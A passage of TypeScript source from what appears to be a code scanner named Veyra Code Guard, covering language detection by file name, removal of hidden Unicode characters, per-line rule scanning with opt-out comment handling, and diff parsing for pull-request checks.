  D: "d", Fortran: "f f90 f95 f03 for", COBOL: "cob cbl", Pascal: "pas pp dpr", Ada: "adb ads", Assembly: "asm s nasm", "Shell script": "sh bash zsh ksh fish", PowerShell: "ps1 psm1 psd1",
  Batch: "bat cmd", AutoHotkey: "ahk", AppleScript: "applescript scpt", SQL: "sql psql plsql", Solidity: "sol", Vyper: "vy", Move: "move", Cairo: "cairo", "Apex (Salesforce)": "trigger apex",
  HTML: "html htm xhtml hta", CSS: "css scss sass less styl", Vue: "vue", Svelte: "svelte", Astro: "astro", "ASP.NET": "asp aspx ascx ashx asmx cshtml razor", JSP: "jsp jspx",
  Templates: "ejs hbs handlebars mustache twig jinja j2 njk liquid pug haml slim", XML: "xml xsl xslt xaml plist csproj vbproj fsproj props targets", JSON: "json jsonc json5",
  YAML: "yaml yml", TOML: "toml", INI: "ini cfg conf properties env", Terraform: "tf tfvars hcl", Nix: "nix", Docker: "dockerfile containerfile", Makefile: "mk mak make", CMake: "cmake",
  Bicep: "bicep", GraphQL: "graphql gql", Protobuf: "proto", Elm: "elm", PureScript: "purs", Tcl: "tcl", Verilog: "v sv svh vhd vhdl", GDScript: "gd", WebAssembly: "wat wast",
  Markdown: "md markdown mdx", Text: "txt rst adoc",
};
const BY_EXTENSION = new Map<string, string>();
for (const [language, exts] of Object.entries(LANGUAGE_EXTENSIONS)) for (const e of exts.split(" ")) if (!BY_EXTENSION.has(e)) BY_EXTENSION.set(e, language);
const BY_NAME: Record<string, string> = {
  dockerfile: "Docker", containerfile: "Docker", makefile: "Makefile", gnumakefile: "Makefile", "cmakelists.txt": "CMake", jenkinsfile: "Groovy", gemfile: "Ruby", rakefile: "Ruby", vagrantfile: "Ruby",
  podfile: "Ruby", brewfile: "Ruby", procfile: "Shell script", ".bashrc": "Shell script", ".zshrc": "Shell script", ".profile": "Shell script", ".bash_profile": "Shell script", pipfile: "TOML",
  ".npmrc": "INI", ".yarnrc": "INI", ".env": "INI", "requirements.txt": "Python", "pip.conf": "INI", "go.mod": "Go", "build.rs": "Rust",
};
/** Languages Code Guard reads code in (every text file is checked; these are the ones it recognises by name). */
export const LANGUAGES = [...new Set([...Object.keys(LANGUAGE_EXTENSIONS), ...Object.values(BY_NAME)])].filter(l => !["Markdown", "Text"].includes(l)).sort();

/** The language of a file, from its name or extension; undefined for files it doesn't recognise (still checked). */
export function languageOf(path: string): string | undefined {
  const name = path.replace(/\\/g, "/").split("/").pop()!.toLowerCase();
  if (BY_NAME[name]) return BY_NAME[name];
  if (/^requirements[\w.-]*\.txt$/.test(name)) return "Python";
  if (/^dockerfile[.-]/.test(name)) return "Docker";
  const dot = name.lastIndexOf(".");
  return dot > 0 || (dot === 0 && name.length > 1) ? BY_EXTENSION.get(name.slice(dot + 1)) : undefined;
}

/** Files per language, most first, for summaries and the report. */
export function languageCounts(paths: Iterable<string>): Array<[string, number]> {
  const counts = new Map<string, number>();
  for (const p of paths) { const l = languageOf(p); if (l) counts.set(l, (counts.get(l) ?? 0) + 1); }
  return [...counts].sort((a, b) => b[1] - a[1] || a[0].localeCompare(b[0]));
}

// ---------- Removing hidden characters ----------

const ZERO_WIDTH_JOINERS = /[‌‍]/;
/**
 * Zero-width joiners are part of emoji sequences (👩‍💻) and of Persian, Arabic and Indic writing. They are only
 * suspicious next to plain ASCII, where they can split or disguise a name. Every other invisible character always is.
 */
function suspiciousInvisible(line: string, at: number) {
  if (!ZERO_WIDTH_JOINERS.test(line[at] ?? "")) return true;
  const before = line.codePointAt(at - 1 >= 0 && /[\udc00-\udfff]/.test(line[at - 1]) ? at - 2 : at - 1) ?? 0x20;
  const after = line.codePointAt(at + 1) ?? 0x20;
  const plain = (c: number) => c < 0x80;
  return plain(before) && plain(after);
}

const HIDDEN = /[‪-‮⁦-⁩​-‍⁠-⁤᠎ㅤᅟᅠﾠ­]/g;
/** Remove text-direction and invisible characters (keeping emoji and script joiners). Returns the new text and how many were removed. */
export function removeHiddenCharacters(text: string): { text: string; removed: number } {
  let removed = 0;
  const out = text.split(/(\r\n|\r|\n)/).map(line => line.replace(HIDDEN, (c, at: number) => {
    if (!suspiciousInvisible(line, at)) return c;
    removed++; return "";
  })).join("");
  return { text: out, removed };
}

/** Scan one file. `path` uses forward slashes and is used to pick which rules apply. */
export function scan(text: string, path: string, options: ScanOptions = {}): Finding[] {
  const file = path.replace(/\\/g, "/");
  if (text.length > 5_000_000 || isBinary(text)) return [];
  const lines = text.split(/\r\n|\r|\n/);
  // A file can opt out entirely (test fixtures full of sample attacks) with a comment in its first five lines.
  if (lines.slice(0, 5).some(l => /veyra-guard-ignore-file/.test(l))) return options.onlyLines ? scanOptOutsOnly(lines, options.onlyLines) : [];
  const disabled = new Set(options.disabled ?? []);
  const min = severityRank(options.minSeverity ?? "low");
  const findings: Finding[] = [];
  const add = (rule: Rule, line: number, column: number, length: number, message: string, matched: string) => {
    if (options.onlyLines && !options.onlyLines.has(line)) return;
    const own = ignoredRules(lines[line - 1] ?? ""), prev = ignoredRules(lines[line - 2] ?? "");
    for (const ig of [own, prev]) if (ig === "all" || ig?.has(rule.id)) return;
    findings.push({ rule: rule.id, title: rule.title, severity: rule.severity, line, column, endColumn: column + Math.max(1, length), message, why: rule.why, fix: FIXES[rule.id] ?? CUSTOM_FIXES.get(rule) ?? "", snippet: visible(matched).slice(0, 200) });
  };
  for (const rule of [...RULES, ...compileCustomRules(options.customRules ?? []).rules]) {
    if (disabled.has(rule.id) || severityRank(rule.severity) < min) continue;
    if (rule.files && !rule.files.test(file)) continue;
    if (rule.skipFiles && rule.skipFiles.test(file)) continue;
    // Documentation isn't run, and often describes attacks: there only hidden characters and leaked keys matter.
    if (DOCS.test(file) && !rule.custom && !/(^|\/)requirements[\w.-]*\.txt$/i.test(file) && rule.id !== "trojan-source" && rule.id !== "secret") continue;
    if (rule.check) {
      for (const f of rule.check(lines, file)) add(rule, f.line, f.column, f.length, f.message, (lines[f.line - 1] ?? "").substr(f.column - 1, f.length));
      continue;
    }
    const re = new RegExp(rule.pattern!.source, rule.pattern!.flags.includes("g") ? rule.pattern!.flags : rule.pattern!.flags + "g");
    lines.forEach((line, i) => {
      if (line.length > 20_000) return; // generated or minified, not hand-written code
      re.lastIndex = 0;
      // One finding per rule per line is enough: the first match that passes the rule's extra test.
      for (let m = re.exec(line); m; m = re.exec(line)) {
        if (!rule.accept || rule.accept(m[0], lines, i, m.index)) { add(rule, i + 1, m.index + 1, m[0].length, rule.message ? rule.message(m[0]) : rule.title, m[0]); break; }
        if (m[0].length === 0) re.lastIndex++;
      }
    });
  }
  // Opt-outs are a way to hide code too: when only new lines are checked (a pull request), report any opt-out it adds.
  if (options.onlyLines && !disabled.has("guard-opt-out")) {
    lines.forEach((line, i) => {
      const at = line.search(/veyra-guard-ignore/);
      if (at >= 0 && options.onlyLines!.has(i + 1)) findings.push({ rule: "guard-opt-out", title: "Turns off Veyra Code Guard checks", severity: "medium", line: i + 1, column: at + 1, endColumn: at + 1 + (/veyra-guard-ignore[\w:,\s-]*/.exec(line.slice(at))?.[0].trimEnd().length ?? 18), message: `This change tells Code Guard to skip ${/veyra-guard-ignore-file/.test(line) ? "this whole file" : "a line"}. Make sure that's intended.`, why: GUARD_OPT_OUT_WHY, fix: FIXES["guard-opt-out"], snippet: visible(line.trim()).slice(0, 200) });
    });
  }
  return findings.sort((a, b) => a.line - b.line || severityRank(b.severity) - severityRank(a.severity));
}

const GUARD_OPT_OUT_WHY = "An attacker who hides malicious code can also add an opt-out comment to stop it being flagged. A reviewer should confirm each opt-out is for a genuine, reviewed reason.";

function scanOptOutsOnly(lines: string[], only: Set<number>): Finding[] {
  return lines.flatMap((line, i) => {
    const at = line.search(/veyra-guard-ignore/);
    return at >= 0 && only.has(i + 1) ? [{ rule: "guard-opt-out", title: "Turns off Veyra Code Guard checks", severity: "medium" as Severity, line: i + 1, column: at + 1, endColumn: at + 1 + 24, message: "This change tells Code Guard to skip this whole file. Make sure that's intended.", why: GUARD_OPT_OUT_WHY, fix: FIXES["guard-opt-out"], snippet: visible(line.trim()).slice(0, 200) }] : [];
  });
}

function isBinary(text: string) { const head = text.slice(0, 8000); return head.includes("\u0000") || (head.match(/[\u0001-\u0008\u000e-\u001a]/g)?.length ?? 0) > 10; }

/** Which rules exist, for settings and documentation. */
export const ruleList = () => [
  ...RULES.map(r => ({ id: r.id, title: r.title, severity: r.severity, why: r.why, fix: FIXES[r.id] ?? "" })),
  { id: "guard-opt-out", title: "Turns off Veyra Code Guard checks", severity: "medium" as Severity, why: GUARD_OPT_OUT_WHY, fix: FIXES["guard-opt-out"] },
];

/** Parse a unified diff patch (as GitHub returns per file) into the new-file line numbers it adds. */
export function addedLines(patch: string): Set<number> {
  const added = new Set<number>();
  let line = 0;
  for (const row of patch.split("\n")) {
    const hunk = /^@@ -\d+(?:,\d+)? \+(\d+)(?:,\d+)? @@/.exec(row);
    if (hunk) { line = Number(hunk[1]); continue; }
    if (row.startsWith("+") && !row.startsWith("+++")) { added.add(line); line++; }
    else if (row.startsWith("-") && !row.startsWith("---")) { /* removed: no new line */ }
    else if (!row.startsWith("\\")) line++;
  }
  return added;
}

export function summarize(findings: Finding[]) {
  const counts: Record<Severity, number> = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const f of findings) counts[f.severity]++;
  return counts;
}
